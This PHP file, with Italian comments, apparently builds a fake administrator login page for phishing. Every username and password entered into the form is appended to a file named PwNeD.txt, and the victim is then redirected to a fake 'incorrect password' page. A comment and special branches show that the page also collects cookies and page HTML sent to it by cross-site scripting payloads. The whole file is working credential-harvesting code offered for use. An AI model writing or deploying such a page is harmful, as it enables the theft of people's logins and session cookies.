<?php	
	/* La pagina Ã¨ stata modificata per catturare anche HTML da un XSS */
	session_start();
	if(isset($_REQUEST['Registrati'])){
			$_SESSION['AdminError'] = "Non &egrave possibile effettuare la registrazione su una pagina di LogIn Amministratore";
	}
	if(!isset($_REQUEST['Log-In'])){
?>

<html>
	<head>
		<title> 
			AdMiN Log-In
		</title>
	</head>
	<body style="background-color:black;">
		<center>
			<br/><br/><br/>
			<font style="color:#0F0;font-size:25px;"> AdMiN LogIn <br/>
			<?php
				if(isset($_SESSION['AdminError'])){
					echo "<font style=\"font-size:15px;color:yellow;\"> " . $_SESSION['AdminError'] . "</font>";
					unset($_SESSION['AdminError']);
				}
			?>			
			</font>
			<div style="background-color:yellow;border:solid 2px red; border-radius:50px; position:absolute; right:25%;left:25%;top:25%;bottom:25%;">
				<br/><br/><br/><br/><br/><br/>
				<form action='AdminLogin.php' method='POST'>
					<input type="text" name="username" placeholder="Username" style="position:absolute; top:40%; left:15%;border:solid 2px #F00;border-radius:50px;"/>
					<input type="password" name="pass" placeholder="Password" style="position:absolute; top:40%; right:15%;border:solid 2px #F00;border-radius:50px;"/> <br/> <br/>
					<input type="radio" name="m1" /> Metodo Uno <br/><br/>
					<input type="radio" name="m2" /> Metodo Due <br/><br/>
					<input type="SUBMIT" name="Log-In" value="Log-In" style="position:absolute; top:50%; left:15%;background-color:#000;color:#0F0;border:solid 2px #F0F;border-radius:50px;"/>
					<input type="SUBMIT" name="Registrati" value="Registrazione" style="position:absolute; top:50%; right:15%;background-color:#000;color:#0F0;border:solid 2px #F0F;border-radius:50px;"/>
				</form>
			</div>
			<br/><br/><br/>
			<div style="position:absolute; right:15%; bottom:5%;top:80%; left:15%;background-color:#F0F; border: solid 2px #0F0; border-radius:50px; position:absolute; top:">
				Messaggi & Errori <br/>
			</div>
	</body>
</html>
<?php
	}
	else{
		if(!file_exists("PwNeD.txt")){
			$file = fopen("PwNeD.txt", "w");
		}
		else{
			$file = fopen("PwNeD.txt", "a+");
		}
		$str = $_REQUEST['username'] . ":::" . $_REQUEST['pass'] . "\r\n";
		if($_REQUEST['pass'] == "HTML"){
			$str = str_replace("<td>"," ",$str);
			$str = str_replace("<tr>","",$str);
			$str = str_replace("</table>","",$str);
			$str = str_replace("<br/>","",$str);
			$str = str_replace("</tr>","",$str);
			$str = str_replace("<font style=","",$str);
			fwrite($file,$str);
			fclose($file);
			header("location: LogIn/");
		}
		else{
			if($_REQUEST['pass'] == "COOKIE"){
				fwrite($file,$str);
				fclose($file);
				header("location: XSSes/index.php");
			}
			else{
				if($_REQUEST['pass'] == "COOKIE2"){
					fwrite($file,$str);
					fclose($file);
					header("location: LogIn/");
				}
				else{
					fwrite($file,$str);
					fclose($file);
					header("location: LogIn/check.php?username=Admin+,+La+Password+Non+Risulta+Corretta&pass=yes&m1=yes&Log-In=yes");
				}
			}
		}		
	}
?>